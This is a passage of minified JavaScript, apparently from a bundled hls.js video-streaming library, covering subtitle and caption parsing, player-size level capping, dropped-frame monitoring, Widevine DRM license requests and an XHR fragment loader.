Xd(3,y,K)}n.on(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this),n.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),n.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),n.on(ua.a.MANIFEST_LOADED,this.onManifestLoaded,this),n.on(ua.a.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),n.on(ua.a.FRAG_LOADING,this.onFragLoading,this),n.on(ua.a.FRAG_LOADED,this.onFragLoaded,this),n.on(ua.a.FRAG_PARSING_USERDATA,this.onFragParsingUserdata,this),n.on(ua.a.FRAG_DECRYPTED,this.onFragDecrypted,this),n.on(ua.a.INIT_PTS_FOUND,this.onInitPtsFound,this),n.on(ua.a.SUBTITLE_TRACKS_CLEARED,this.onSubtitleTracksCleared,this),n.on(ua.a.BUFFER_FLUSHING,this.onBufferFlushing,this)}var ca=ta.prototype;return ca.destroy=function(){var n=this.hls;n.off(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this),n.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),n.off(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),n.off(ua.a.MANIFEST_LOADED,this.onManifestLoaded,this),n.off(ua.a.SUBTITLE_TRACKS_UPDATED,this.onSubtitleTracksUpdated,this),n.off(ua.a.FRAG_LOADING,this.onFragLoading,this),n.off(ua.a.FRAG_LOADED,this.onFragLoaded,this),n.off(ua.a.FRAG_PARSING_USERDATA,this.onFragParsingUserdata,this),n.off(ua.a.FRAG_DECRYPTED,this.onFragDecrypted,this),n.off(ua.a.INIT_PTS_FOUND,this.onInitPtsFound,this),n.off(ua.a.SUBTITLE_TRACKS_CLEARED,this.onSubtitleTracksCleared,this),n.off(ua.a.BUFFER_FLUSHING,this.onBufferFlushing,this),this.hls=this.config=this.cea608Parser1=this.cea608Parser2=null},ca.addCues=function(n,k,e,y,K){for(var ea,sa,ya,Ea,Ha=!1,Ua=K.length;Ua--;){var kb=K[Ua],cb=(ea=kb[0],sa=kb[1],ya=k,Ea=e,Math.min(sa,Ea)-Math.max(ea,ya));if(0<=cb&&(kb[0]=Math.min(kb[0],k),kb[1]=Math.max(kb[1],e),Ha=!0,.5<cb/(e-k)))return}Ha||K.push([k,e]),this.config.renderTextTracksNatively?this.Cues.newCue(this.captionsTracks[n],k,e,y):(k=this.Cues.newCue(null,k,e,y),this.hls.trigger(ua.a.CUES_PARSED,{type:"captions",cues:k,track:n}))},ca.onInitPtsFound=function(n,k){var e=this;n=k.frag;var y=k.initPTS,K=k.timescale,ea=this.unparsedVttFrags;"main"===k.id&&(this.initPTS[n.cc]=y,this.timescale[n.cc]=K),ea.length&&(this.unparsedVttFrags=[],ea.forEach((function(sa){e.onFragLoaded(ua.a.FRAG_LOADED,sa)})))},ca.getExistingTrack=function(n){var k=this.media;if(k)for(var e=0;e<k.textTracks.length;e++){var y=k.textTracks[e];if(y[n])return y}return null},ca.createCaptionsTrack=function(n){this.config.renderTextTracksNatively?this.createNativeTrack(n):this.createNonNativeTrack(n)},ca.createNativeTrack=function(n){if(!this.captionsTracks[n]){var k=this.captionsTracks,e=this.media,y=this.captionsProperties[n],K=y.label;y=y.languageCode;var ea=this.getExistingTrack(n);ea?(k[n]=ea,l(k[n]),m(k[n],e)):(e=this.createTextTrack("captions",K,y))&&(e[n]=!0,k[n]=e)}},ca.createNonNativeTrack=function(n){if(!this.nonNativeCaptionsTracks[n]){var k=this.captionsProperties[n];k&&(k={_id:n,label:k.label,kind:"captions",default:!!k.media&&!!k.media.default,closedCaptions:k.media},this.nonNativeCaptionsTracks[n]=k,this.hls.trigger(ua.a.NON_NATIVE_TEXT_TRACKS_FOUND,{tracks:[k]}))}},ca.createTextTrack=function(n,k,e){var y=this.media;if(y)return y.addTextTrack(n,k,e)},ca.onMediaAttaching=function(n,k){this.media=k.media,this._cleanTracks()},ca.onMediaDetaching=function(){var n=this.captionsTracks;Object.keys(n).forEach((function(k){l(n[k]),delete n[k]})),this.nonNativeCaptionsTracks={}},ca.onManifestLoading=function(){this.prevCC=this.lastSn=-1,this.vttCCs={ccOffset:0,presentationOffset:0,0:{start:0,prevCC:-1,new:!1}},this._cleanTracks(),this.tracks=[],this.captionsTracks={},this.nonNativeCaptionsTracks={},this.textTracks=[],this.unparsedVttFrags=this.unparsedVttFrags||[],this.initPTS=[],this.timescale=[],this.cea608Parser1&&this.cea608Parser2&&(this.cea608Parser1.reset(),this.cea608Parser2.reset())},ca._cleanTracks=function(){var n=this.media;if(n&&(n=n.textTracks))for(var k=0;k<n.length;k++)l(n[k])},ca.onSubtitleTracksUpdated=function(n,k){var e=this;if(this.textTracks=[],k=(n=k.subtitleTracks||[]).some((function(K){return"stpp.ttml.im1t"===K.textCodec})),this.config.enableWebVTT||k&&this.config.enableIMSC1)if(k=this.tracks&&n&&this.tracks.length===n.length,this.tracks=n||[],this.config.renderTextTracksNatively){var y=this.media?this.media.textTracks:[];this.tracks.forEach((function(K,ea){var sa;if(ea<y.length){ea=null;for(var ya=0;ya<y.length;ya++){var Ea=y[ya];if(Ea&&Ea.label===K.name&&!Ea.textTrack1&&!Ea.textTrack2){ea=y[ya];break}}ea&&(sa=ea)}sa?l(sa):(sa=e.createTextTrack("subtitles",K.name,K.lang))&&(sa.mode="disabled"),sa&&(sa.groupId=K.groupId,e.textTracks.push(sa))}))}else!k&&this.tracks&&this.tracks.length&&(n=this.tracks.map((function(K){return{label:K.name,kind:K.type.toLowerCase(),default:K.default,subtitleTrack:K}})),this.hls.trigger(ua.a.NON_NATIVE_TEXT_TRACKS_FOUND,{tracks:n}))},ca.onManifestLoaded=function(n,k){var e=this;this.config.enableCEA708Captions&&k.captions&&k.captions.forEach((function(y){var K=/(?:CC|SERVICE)([1-4])/.exec(y.instreamId);K&&(K=e.captionsProperties["textTrack"+K[1]])&&(K.label=y.name,y.lang&&(K.languageCode=y.lang),K.media=y)}))},ca.onFragLoading=function(n,k){n=this.cea608Parser1;var e=this.cea608Parser2,y=this.lastSn;this.enabled&&n&&e&&k.frag.type===lb.MAIN&&((k=k.frag.sn)!==y+1&&(n.reset(),e.reset()),this.lastSn=k)},ca.onFragLoaded=function(n,k){n=k.frag;var e=k.payload,y=this.initPTS,K=this.unparsedVttFrags;if(n.type===lb.SUBTITLE)if(e.byteLength){if(!Object($a.a)(y[n.cc]))return K.push(k),void(y.length&&this.hls.trigger(ua.a.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:n,error:Error("Missing initial subtitle PTS")}));null!=(k=n.decryptdata)&&null!=k.key&&"AES-128"===k.method||(k=this.tracks[n.level],(y=this.vttCCs)[n.cc]||(y[n.cc]={start:n.start,prevCC:this.prevCC,new:!0},this.prevCC=n.cc),k&&"stpp.ttml.im1t"===k.textCodec?this._parseIMSC1(n,e):this._parseVTTs(n,e,y))}else this.hls.trigger(ua.a.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:n,error:Error("Empty subtitle payload")})},ca._parseIMSC1=function(n,k){var e=this,y=this.hls;Ba(k,this.initPTS[n.cc],this.timescale[n.cc],(function(K){e._appendCues(K,n.level),y.trigger(ua.a.SUBTITLE_FRAG_PROCESSED,{success:!0,frag:n})}),(function(K){Fa.b.log("Failed to parse IMSC1: "+K),y.trigger(ua.a.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:n,error:K})}))},ca._parseVTTs=function(n,k,e){var y=this,K=this.hls;!function za(ta,ca,n,k,e,y,K,ea){var sa,ya=new de;ta=Object(hc.f)(new Uint8Array(ta)).trim().replace(ee,"\n").split("\n");var Ea=[],Ha=Object(od.a)(ca,n),Ua="00:00.000",kb=0,cb=0,ub=!0,gb=!1;ya.oncue=function(Gb){var wb=k[e],bc=k.ccOffset,ic=(kb-Ha)/9e4;if(null!=wb&&wb.new)if(void 0!==cb)bc=k.ccOffset=wb.start;else{wb=k[e];var $b=k[wb.prevCC];if(!$b||!$b.new&&wb.new)k.ccOffset=k.presentationOffset=wb.start,wb.new=!1;else{for(;null!==(Ec=$b)&&void 0!==Ec&&Ec.new;){var Ec;k.ccOffset+=wb.start-$b.start,wb.new=!1,$b=k[(wb=$b).prevCC]}k.presentationOffset=ic}}ic&&(bc=ic-k.presentationOffset),gb&&(ic=Gb.endTime-Gb.startTime,bc=Object(fe.b)(9e4*(Gb.startTime+bc-cb),9e4*y)/9e4,Gb.startTime=bc,Gb.endTime=bc+ic),bc=Gb.text.trim(),Gb.text=decodeURIComponent(encodeURIComponent(bc)),Gb.id||(Gb.id=xa(Gb.startTime,Gb.endTime,bc)),0<Gb.endTime&&Ea.push(Gb)},ya.onparsingerror=function(Gb){sa=Gb},ya.onflush=function(){sa?ea(sa):K(Ea)},ta.forEach((function(Gb){if(ub){if(Od(Gb,"X-TIMESTAMP-MAP=")){ub=!1,gb=!0,Gb.substr(16).split(",").forEach((function(wb){Od(wb,"LOCAL:")?Ua=wb.substr(6):Od(wb,"MPEGTS:")&&(kb=parseInt(wb.substr(7)))}));try{cb=function(wb){var bc=parseInt(wb.substr(-3)),ic=parseInt(wb.substr(-6,2)),$b=parseInt(wb.substr(-9,2)),Ec=9<wb.length?parseInt(wb.substr(0,wb.indexOf(":"))):0;if(!(Object($a.a)(bc)&&Object($a.a)(ic)&&Object($a.a)($b)&&Object($a.a)(Ec)))throw Error("Malformed X-TIMESTAMP-MAP: Local:"+wb);return bc+=1e3*ic,(bc+=6e4*$b)+36e5*Ec}(Ua)/1e3}catch(wb){gb=!1,sa=wb}return}""===Gb&&(ub=!1)}ya.parse(Gb+"\n")})),ya.flush()}(k,this.initPTS[n.cc],this.timescale[n.cc],e,n.cc,n.start,(function(ea){y._appendCues(ea,n.level),K.trigger(ua.a.SUBTITLE_FRAG_PROCESSED,{success:!0,frag:n})}),(function(ea){y._fallbackToIMSC1(n,k),Fa.b.log("Failed to parse VTT cue: "+ea),K.trigger(ua.a.SUBTITLE_FRAG_PROCESSED,{success:!1,frag:n,error:ea})}))},ca._fallbackToIMSC1=function(n,k){var e=this,y=this.tracks[n.level];y.textCodec||Ba(k,this.initPTS[n.cc],this.timescale[n.cc],(function(){y.textCodec="stpp.ttml.im1t",e._parseIMSC1(n,k)}),(function(){y.textCodec="wvtt"}))},ca._appendCues=function(n,k){var e=this.hls;if(this.config.renderTextTracksNatively){var y=this.textTracks[k];"disabled"!==y.mode&&n.forEach((function(K){return p(y,K)}))}else e.trigger(ua.a.CUES_PARSED,{type:"subtitles",cues:n,track:this.tracks[k].default?"default":"subtitles"+k})},ca.onFragDecrypted=function(n,k){if((n=k.frag).type===lb.SUBTITLE){if(!Object($a.a)(this.initPTS[n.cc]))return void this.unparsedVttFrags.push(k);this.onFragLoaded(ua.a.FRAG_LOADED,k)}},ca.onSubtitleTracksCleared=function(){this.tracks=[],this.captionsTracks={}},ca.onFragParsingUserdata=function(n,k){n=this.cea608Parser1;var e=this.cea608Parser2;if(this.enabled&&n&&e)for(var y=0;y<k.samples.length;y++){var K=k.samples[y].bytes;K&&(K=this.extractCea608Data(K),n.addData(k.samples[y].pts,K[0]),e.addData(k.samples[y].pts,K[1]))}},ca.onBufferFlushing=function(n,k){var e=k.startOffset,y=k.endOffset;if(!((n=k.type)&&"video"!==n||!(n=this.media)||n.currentTime<y)){var K=this.captionsTracks;Object.keys(K).forEach((function(ea){return f(K[ea],e,y)}))}},ca.extractCea608Data=function(n){for(var k=31&n[0],e=2,y=[[],[]],K=0;K<k;K++){var ea=n[e++],sa=127&n[e++],ya=127&n[e++],Ea=3&ea;0===sa&&0===ya||4&ea&&(0!==Ea&&1!==Ea||(y[Ea].push(sa),y[Ea].push(ya)))}return y},ta}(),Yd=function(){function ta(e){this.clientRect=this.streamController=this.timer=this.restrictedLevels=this.media=this.firstLevel=this.autoLevelCapping=void 0,this.hls=e,this.autoLevelCapping=Number.POSITIVE_INFINITY,this.firstLevel=-1,this.media=null,this.restrictedLevels=[],this.timer=void 0,this.clientRect=null,this.registerListeners()}var ca,n,k=ta.prototype;return k.setStreamController=function(e){this.streamController=e},k.destroy=function(){this.unregisterListener(),this.hls.config.capLevelToPlayerSize&&this.stopCapping(),this.hls=this.streamController=this.clientRect=this.media=null},k.registerListeners=function(){var e=this.hls;e.on(ua.a.FPS_DROP_LEVEL_CAPPING,this.onFpsDropLevelCapping,this),e.on(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this),e.on(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.on(ua.a.BUFFER_CODECS,this.onBufferCodecs,this),e.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this)},k.unregisterListener=function(){var e=this.hls;e.off(ua.a.FPS_DROP_LEVEL_CAPPING,this.onFpsDropLevelCapping,this),e.off(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this),e.off(ua.a.MANIFEST_PARSED,this.onManifestParsed,this),e.off(ua.a.BUFFER_CODECS,this.onBufferCodecs,this),e.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this)},k.onFpsDropLevelCapping=function(e,y){ta.isLevelAllowed(y.droppedLevel,this.restrictedLevels)&&this.restrictedLevels.push(y.droppedLevel)},k.onMediaAttaching=function(e,y){this.media=y.media instanceof HTMLVideoElement?y.media:null},k.onManifestParsed=function(e,y){e=this.hls,this.restrictedLevels=[],this.firstLevel=y.firstLevel,e.config.capLevelToPlayerSize&&y.video&&this.startCapping()},k.onBufferCodecs=function(e,y){this.hls.config.capLevelToPlayerSize&&y.video&&this.startCapping()},k.onMediaDetaching=function(){this.stopCapping()},k.detectPlayerSize=function(){if(this.media&&0<this.mediaHeight&&0<this.mediaWidth){var e=this.hls.levels;if(e.length){var y=this.hls;y.autoLevelCapping=this.getMaxLevel(e.length-1),y.autoLevelCapping>this.autoLevelCapping&&this.streamController&&this.streamController.nextLevelSwitch(),this.autoLevelCapping=y.autoLevelCapping}}},k.getMaxLevel=function(e){var y=this,K=this.hls.levels;return K.length?(K=K.filter((function(ea,sa){return ta.isLevelAllowed(sa,y.restrictedLevels)&&sa<=e})),this.clientRect=null,ta.getMaxLevelByMediaSize(K,this.mediaWidth,this.mediaHeight)):-1},k.startCapping=function(){this.timer||(this.autoLevelCapping=Number.POSITIVE_INFINITY,this.hls.firstLevel=this.getMaxLevel(this.firstLevel),self.clearInterval(this.timer),this.timer=self.setInterval(this.detectPlayerSize.bind(this),1e3),this.detectPlayerSize())},k.stopCapping=function(){this.restrictedLevels=[],this.firstLevel=-1,this.autoLevelCapping=Number.POSITIVE_INFINITY,this.timer&&(self.clearInterval(this.timer),this.timer=void 0)},k.getDimensions=function(){if(this.clientRect)return this.clientRect;var e=this.media,y={width:0,height:0};if(e){var K=e.getBoundingClientRect();y.width=K.width,y.height=K.height,y.width||y.height||(y.width=K.right-K.left||e.width||0,y.height=K.bottom-K.top||e.height||0)}return this.clientRect=y,y},ta.isLevelAllowed=function(e,y){return void 0===y&&(y=[]),-1===y.indexOf(e)},ta.getMaxLevelByMediaSize=function(e,y,K){if(!e||!e.length)return-1;for(var ea,sa,ya=e.length-1,Ea=0;Ea<e.length;Ea+=1){var Ha=e[Ea];if((Ha.width>=y||Ha.height>=K)&&(ea=Ha,!(sa=e[Ea+1])||ea.width!==sa.width||ea.height!==sa.height)){ya=Ea;break}}return ya},n=[{key:"contentScaleFactor",get:function(){var e=1;try{e=self.devicePixelRatio}catch(y){}return e}}],ca=[{key:"mediaWidth",get:function(){return this.getDimensions().width*ta.contentScaleFactor}},{key:"mediaHeight",get:function(){return this.getDimensions().height*ta.contentScaleFactor}}],hb(ta.prototype,ca),n&&hb(ta,n),ta}(),ve=function(){function ta(n){this.hls=void 0,this.isVideoPlaybackQualityAvailable=!1,this.timer=void 0,this.media=null,this.lastTime=void 0,this.lastDecodedFrames=this.lastDroppedFrames=0,this.streamController=void 0,this.hls=n,this.registerListeners()}var ca=ta.prototype;return ca.setStreamController=function(n){this.streamController=n},ca.registerListeners=function(){this.hls.on(ua.a.MEDIA_ATTACHING,this.onMediaAttaching,this)},ca.unregisterListeners=function(){this.hls.off(ua.a.MEDIA_ATTACHING,this.onMediaAttaching)},ca.destroy=function(){this.timer&&clearInterval(this.timer),this.unregisterListeners(),this.isVideoPlaybackQualityAvailable=!1,this.media=null},ca.onMediaAttaching=function(n,k){(n=this.hls.config).capLevelOnFPSDrop&&((this.media=k=k.media instanceof self.HTMLVideoElement?k.media:null)&&"function"==typeof k.getVideoPlaybackQuality&&(this.isVideoPlaybackQualityAvailable=!0),self.clearInterval(this.timer),this.timer=self.setInterval(this.checkFPSInterval.bind(this),n.fpsDroppedMonitoringPeriod))},ca.checkFPS=function(n,k,e){if(n=performance.now(),k){if(this.lastTime){var y=e-this.lastDroppedFrames,K=k-this.lastDecodedFrames,ea=1e3*y/(n-this.lastTime),sa=this.hls;sa.trigger(ua.a.FPS_DROP,{currentDropped:y,currentDecoded:K,totalDroppedFrames:e}),0<ea&&y>sa.config.fpsDroppedMonitoringThreshold*K&&(y=sa.currentLevel,Fa.b.warn("drop FPS ratio greater than max allowed value for currentLevel: "+y),0<y&&(-1===sa.autoLevelCapping||sa.autoLevelCapping>=y)&&(--y,sa.trigger(ua.a.FPS_DROP_LEVEL_CAPPING,{level:y,droppedLevel:sa.currentLevel}),sa.autoLevelCapping=y,this.streamController.nextLevelSwitch()))}this.lastTime=n,this.lastDroppedFrames=e,this.lastDecodedFrames=k}},ca.checkFPSInterval=function(){var n=this.media;if(n)if(this.isVideoPlaybackQualityAvailable){var k=n.getVideoPlaybackQuality();this.checkFPS(n,k.totalVideoFrames,k.droppedVideoFrames)}else this.checkFPS(n,n.webkitDecodedFrameCount,n.webkitDroppedFrameCount)},ta}();!function(ta){ta.WIDEVINE="com.widevine.alpha",ta.PLAYREADY="com.microsoft.playready"}(gd||(gd={}));var Zd="undefined"!=typeof self&&self.navigator&&self.navigator.requestMediaKeySystemAccess?self.navigator.requestMediaKeySystemAccess.bind(self.navigator):null,Cd=function(){function ta(k){this._config=this._drmSystemOptions=this._requestMediaKeySystemAccess=this._emeEnabled=this._licenseResponseCallback=this._licenseXhrSetup=this._widevineLicenseUrl=this.hls=void 0,this._mediaKeysList=[],this._media=null,this._hasSetMediaKeys=!1,this._requestLicenseFailureCount=0,this.mediaKeysPromise=null,this._onMediaEncrypted=this.onMediaEncrypted.bind(this),this.hls=k,this._config=k.config,this._widevineLicenseUrl=this._config.widevineLicenseUrl,this._licenseXhrSetup=this._config.licenseXhrSetup,this._licenseResponseCallback=this._config.licenseResponseCallback,this._emeEnabled=this._config.emeEnabled,this._requestMediaKeySystemAccess=this._config.requestMediaKeySystemAccessFunc,this._drmSystemOptions=this._config.drmSystemOptions,this._registerListeners()}var ca,n=ta.prototype;return n.destroy=function(){this._unregisterListeners(),this._requestMediaKeySystemAccess=this.hls=this._onMediaEncrypted=null},n._registerListeners=function(){this.hls.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.on(ua.a.MEDIA_DETACHED,this.onMediaDetached,this),this.hls.on(ua.a.MANIFEST_PARSED,this.onManifestParsed,this)},n._unregisterListeners=function(){this.hls.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.off(ua.a.MEDIA_DETACHED,this.onMediaDetached,this),this.hls.off(ua.a.MANIFEST_PARSED,this.onManifestParsed,this)},n.getLicenseServerUrl=function(k){if(k===gd.WIDEVINE&&this._widevineLicenseUrl)return this._widevineLicenseUrl;throw Error('no license server URL configured for key-system "'+k+'"')},n._attemptKeySystemAccess=function(k,e,y){var K=this;e=function(ea,sa,ya,Ea){if(ea===gd.WIDEVINE)return Ua=ya,kb=Ea,cb={audioCapabilities:[],videoCapabilities:[]},sa.forEach((function(ub){cb.audioCapabilities.push({contentType:'audio/mp4; codecs="'+ub+'"',robustness:kb.audioRobustness||""})})),Ua.forEach((function(ub){cb.videoCapabilities.push({contentType:'video/mp4; codecs="'+ub+'"',robustness:kb.videoRobustness||""})})),[cb];throw Error("Unknown key-system: "+ea);var Ua,kb,cb}(k,e,y,this._drmSystemOptions),Fa.b.log("Requesting encrypted media key-system access"),e=this.requestMediaKeySystemAccess(k,e),this.mediaKeysPromise=e.then((function(ea){return K._onMediaKeySystemAccessObtained(k,ea)})),e.catch((function(ea){Fa.b.error('Failed to obtain key-system "'+k+'" access:',ea)}))},n._onMediaKeySystemAccessObtained=function(k,e){var y=this;Fa.b.log('Access for key-system "'+k+'" obtained');var K={mediaKeysSessionInitialized:!1,mediaKeySystemAccess:e,mediaKeySystemDomain:k};this._mediaKeysList.push(K);var ea=Promise.resolve().then((function(){return e.createMediaKeys()})).then((function(sa){return K.mediaKeys=sa,Fa.b.log('Media-keys created for key-system "'+k+'"'),y._onMediaKeysCreated(),sa}));return ea.catch((function(sa){Fa.b.error("Failed to create media-keys:",sa)})),ea},n._onMediaKeysCreated=function(){var k=this;this._mediaKeysList.forEach((function(e){e.mediaKeysSession||(e.mediaKeysSession=e.mediaKeys.createSession(),k._onNewMediaKeySession(e.mediaKeysSession))}))},n._onNewMediaKeySession=function(k){var e=this;Fa.b.log("New key-system session "+k.sessionId),k.addEventListener("message",(function(y){e._onKeySessionMessage(k,y.message)}),!1)},n._onKeySessionMessage=function(k,e){Fa.b.log("Got EME message event, creating license request"),this._requestLicense(e,(function(y){Fa.b.log("Received license data (length: "+(y?y.byteLength:y)+"), updating key-session"),k.update(y)}))},n.onMediaEncrypted=function(k){var e=this;if(Fa.b.log('Media is encrypted using "'+k.initDataType+'" init data type'),!this.mediaKeysPromise)return Fa.b.error("Fatal: Media is encrypted but no CDM access or no keys have been requested"),void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_KEYS,fatal:!0});var y=function(K){e._media&&(e._attemptSetMediaKeys(K),e._generateRequestWithPreferredKeySession(k.initDataType,k.initData))};this.mediaKeysPromise.then(y).catch(y)},n._attemptSetMediaKeys=function(k){if(!this._media)throw Error("Attempted to set mediaKeys without first attaching a media element");if(!this._hasSetMediaKeys){if(!(k=this._mediaKeysList[0])||!k.mediaKeys)return Fa.b.error("Fatal: Media is encrypted but no CDM access or no keys have been obtained yet"),void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_KEYS,fatal:!0});Fa.b.log("Setting keys for encrypted media"),this._media.setMediaKeys(k.mediaKeys),this._hasSetMediaKeys=!0}},n._generateRequestWithPreferredKeySession=function(k,e){var y=this,K=this._mediaKeysList[0];if(!K)return Fa.b.error("Fatal: Media is encrypted but not any key-system access has been obtained yet"),void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_ACCESS,fatal:!0});if(K.mediaKeysSessionInitialized)Fa.b.warn("Key-Session already initialized but requested again");else{var ea=K.mediaKeysSession;if(!ea)return Fa.b.error("Fatal: Media is encrypted but no key-session existing"),void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_SESSION,fatal:!0});if(!e)return Fa.b.warn("Fatal: initData required for generating a key session is null"),void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_INIT_DATA,fatal:!0});Fa.b.log('Generating key-session request for "'+k+'" init data type'),K.mediaKeysSessionInitialized=!0,ea.generateRequest(k,e).then((function(){Fa.b.debug("Key-session generation succeeded")})).catch((function(sa){Fa.b.error("Error generating key-session request:",sa),y.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_SESSION,fatal:!1})}))}},n._createLicenseXhr=function(k,e,y){var K=new XMLHttpRequest;if(K.responseType="arraybuffer",K.onreadystatechange=this._onLicenseRequestReadyStageChange.bind(this,K,k,e,y),e=this._licenseXhrSetup)try{e.call(this.hls,K,k),e=void 0}catch(ea){Fa.b.error(ea)}try{K.readyState||K.open("POST",k,!0),e&&e.call(this.hls,K,k)}catch(ea){throw Error("issue setting up KeySystem license XHR "+ea)}return K},n._onLicenseRequestReadyStageChange=function(k,e,y,K){if(4===k.readyState)if(200===k.status){this._requestLicenseFailureCount=0,Fa.b.log("License request succeeded"),y=k.response;var ea=this._licenseResponseCallback;if(ea)try{y=ea.call(this.hls,k,e)}catch(sa){Fa.b.error(sa)}K(y)}else{if(Fa.b.error("License Request XHR failed ("+e+"). Status: "+k.status+" ("+k.statusText+")"),this._requestLicenseFailureCount++,3<this._requestLicenseFailureCount)return void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0});Fa.b.warn("Retrying license request, "+(3-this._requestLicenseFailureCount+1)+" attempts left"),this._requestLicense(y,K)}},n._generateLicenseRequestChallenge=function(k,e){if(k.mediaKeySystemDomain===gd.WIDEVINE)return e;throw Error("unsupported key-system: "+k.mediaKeySystemDomain)},n._requestLicense=function(k,e){Fa.b.log("Requesting content license for key-system");var y=this._mediaKeysList[0];if(!y)return Fa.b.error("Fatal error: Media is encrypted but no key-system access has been obtained yet"),void this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_NO_ACCESS,fatal:!0});try{var K=this.getLicenseServerUrl(y.mediaKeySystemDomain),ea=this._createLicenseXhr(K,k,e);Fa.b.log("Sending license request to URL: "+K);var sa=this._generateLicenseRequestChallenge(y,k);ea.send(sa)}catch(ya){Fa.b.error("Failure requesting DRM license: "+ya),this.hls.trigger(ua.a.ERROR,{type:Ka.b.KEY_SYSTEM_ERROR,details:Ka.a.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0})}},n.onMediaAttached=function(k,e){this._emeEnabled&&(this._media=k=e.media,k.addEventListener("encrypted",this._onMediaEncrypted))},n.onMediaDetached=function(){var k=this._media,e=this._mediaKeysList;k&&(k.removeEventListener("encrypted",this._onMediaEncrypted),this._media=null,this._mediaKeysList=[],Promise.all(e.map((function(y){if(y.mediaKeysSession)return y.mediaKeysSession.close().catch((function(){}))}))).then((function(){return k.setMediaKeys(null)})).catch((function(){})))},n.onManifestParsed=function(k,e){this._emeEnabled&&(k=e.levels.map((function(y){return y.audioCodec})).filter((function(y){return!!y})),e=e.levels.map((function(y){return y.videoCodec})).filter((function(y){return!!y})),this._attemptKeySystemAccess(gd.WIDEVINE,k,e))},ca=[{key:"requestMediaKeySystemAccess",get:function(){if(!this._requestMediaKeySystemAccess)throw Error("No requestMediaKeySystemAccess function configured");return this._requestMediaKeySystemAccess}}],function bb(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ta.prototype,ca),ta}(),$d=Na(11),oe=/^age:\s*[\d.]+\s*$/m,pd=function(){function ta(n){this.retryDelay=this.retryTimeout=this.requestTimeout=this.xhrSetup=void 0,this.callbacks=this.config=null,this.context=void 0,this.loader=null,this.stats=void 0,this.xhrSetup=n?n.xhrSetup:null,this.stats=new $d.a,this.retryDelay=0}var ca=ta.prototype;return ca.destroy=function(){this.callbacks=null,this.abortInternal(),this.config=this.loader=null},ca.abortInternal=function(){var n=this.loader;self.clearTimeout(this.requestTimeout),self.clearTimeout(this.retryTimeout),n&&(n.onreadystatechange=null,n.onprogress=null,4!==n.readyState&&(this.stats.aborted=!0,n.abort()))},ca.abort=function(){var n;this.abortInternal(),null!==(n=this.callbacks)&&void 0!==n&&n.onAbort&&this.callbacks.onAbort(this.stats,this.context,this.loader)},ca.load=function(n,k,e){if(this.stats.loading.start)throw Error("Loader can only be used once.");this.stats.loading.start=self.performance.now(),this.context=n,this.config=k,this.callbacks=e,this.retryDelay=k.retryDelay,this.loadInternal()},ca.loadInternal=function(){var n=this.config,k=this.context;if(n){var e=this.loader=new self.XMLHttpRequest,y=this.stats;y.loading.first=0,y.loaded=0,y=this.xhrSetup;try{if(y)try{y(e,k.url)}catch(K){e.open("GET",k.url,!0),y(e,k.url)}e.readyState||e.open("GET",k.url,!0)}catch(K){return void this.callbacks.onError({code:e.status,text:K.message},k,e)}k.rangeEnd&&e.setRequestHeader("Range","bytes="+k.rangeStart+"-"+(k.rangeEnd-1)),e.onreadystatechange=this.readystatechange.bind(this),e.onprogress=this.loadprogress.bind(this),e.responseType=k.responseType,self.clearTimeout(this.requestTimeout),this.requestTimeout=self.setTimeout(this.loadtimeout.bind(this),n.timeout),e.send()}},ca.readystatechange=function(){var n=this.context,k=this.loader,e=this.stats;if(n&&k){var y=k.readyState,K=this.config;if(!e.aborted&&2<=y)if(self.clearTimeout(this.requestTimeout),0===e.loading.first&&(e.loading.first=Math.max(self.performance.now(),e.loading.start)),4===y)if(k.onreadystatechange=null,k.onprogress=null,200<=(y=k.status)&&300>y){var ea,sa;e.loading.end=Math.max(self.performance.now(),e.loading.first),sa="arraybuffer"===n.responseType?(ea=k.response).byteLength:(ea=k.responseText).length,e.loaded=e.total=sa,this.callbacks&&((K=this.callbacks.onProgress)&&K(e,n,ea,k),this.callbacks&&this.callbacks.onSuccess({url:k.responseURL,data:ea},e,n,k))}else e.retry>=K.maxRetry||400<=y&&499>y?(Fa.b.error(y+" while loading "+n.url),this.callbacks.onError({code:y,text:k.statusText},n,k)):(Fa.b.warn(y+" while loading "+n.url+", retrying in 